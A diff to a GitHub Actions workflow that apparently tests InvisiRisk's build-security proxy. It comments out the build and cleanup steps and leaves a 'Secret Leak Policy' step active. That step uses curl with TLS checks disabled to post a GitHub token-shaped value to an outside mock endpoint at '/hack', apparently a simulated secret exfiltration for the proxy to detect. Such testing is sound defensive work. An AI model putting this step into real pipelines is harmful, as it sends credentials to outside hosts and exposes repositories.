@@ -22,13 +22,6 @@ jobs:
           # mode: sidecar
           debug: true
       # ============= InvisiRisk Setup End =============
-      - name: Checkout repo
-        uses: actions/checkout@v4
-
-      - name: Setup Node
-        uses: actions/setup-node@v4
-        with:
-          node-version: 20
       - name: Secret Leak Policy
         run: |
           curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
@@ -37,6 +30,13 @@ jobs:
             "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
           }'
           echo "Exit code: $?"
+      # - name: Checkout repo
+      #   uses: actions/checkout@v4
+
+      # - name: Setup Node
+      #   uses: actions/setup-node@v4
+      #   with:
+      #     node-version: 20
 
       # - name: Install dependencies
       #   run: npm install
@@ -44,14 +44,14 @@ jobs:
       # - name: Build (host)
       #   run: npm run build
 
-      - name: Build Docker image
-        run: BUILDKIT=1 docker build -t sample-npm-docker --build-arg BUILDKIT_SYNTAX=public.ecr.aws/w3c0c0n7/invisirisk/baf-buildkit:dev-test --secret id=pse-ca,src=/etc/ssl/certs/pse.pem  --build-arg PSE_PROXY=http://${PSE_PROXY_IP}:3128 .
+      # - name: Build Docker image
+      #   run: BUILDKIT=1 docker build -t sample-npm-docker --build-arg BUILDKIT_SYNTAX=public.ecr.aws/w3c0c0n7/invisirisk/baf-buildkit:dev-test --secret id=pse-ca,src=/etc/ssl/certs/pse.pem  --build-arg PSE_PROXY=http://${PSE_PROXY_IP}:3128 .
 
-      # ============= InvisiRisk Cleanup =============
-      - name: Cleanup PSE
-        if: always()
-        uses: invisirisk/pse-action@develop
-        with:
-          cleanup: "true"
-      # ============= InvisiRisk Cleanup End =============
+      # # ============= InvisiRisk Cleanup =============
+      # - name: Cleanup PSE
+      #   if: always()
+      #   uses: invisirisk/pse-action@develop
+      #   with:
+      #     cleanup: "true"
+      # # ============= InvisiRisk Cleanup End =============
 
